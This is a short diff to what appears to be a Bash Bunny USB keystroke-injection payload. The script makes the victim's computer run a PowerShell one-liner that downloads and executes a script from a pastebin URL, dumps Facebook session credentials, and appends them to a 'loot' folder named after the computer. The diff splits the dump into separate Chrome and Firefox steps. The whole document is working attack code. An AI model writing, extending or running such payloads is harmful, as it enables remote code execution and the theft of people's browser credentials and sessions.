@@ -37,7 +37,9 @@ Q ENTER
 Q DELAY 100
 
 #Dump Chrome Creds
-Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/pastebin.com\/raw\/25Z8peMb\'\)\; Get-FacebookCreds \| Out-File -Append \$Bunny\\loot\\FacebookSession\\\$env:computername.txt
+Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/pastebin.com\/raw\/25Z8peMb\'\)\; Get-FacebookCreds-Chrome \| Out-File -Append \$Bunny\\loot\\FacebookSession\\\$env:computername.txt
+Q ENTER
+Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/pastebin.com\/raw\/25Z8peMb\'\)\; Get-FacebookCreds-Firefox \| Out-File -Append \$Bunny\\loot\\FacebookSession\\\$env:computername.txt
 Q ENTER
 Q DELAY 100
 Q STRING exit
